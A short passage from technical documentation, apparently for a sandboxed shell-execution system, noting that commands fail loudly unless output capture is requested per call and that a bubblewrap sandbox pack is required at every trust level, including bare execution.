commands fail loudly. Request `capture` per call instead.

**And the second most important fact (see §3.7, §4.3):** the bwrap pack is
mandatory at every trust level, including bare. Selecting it with
`execution: bare` gives you bare; omitting it gives you a broken shell.
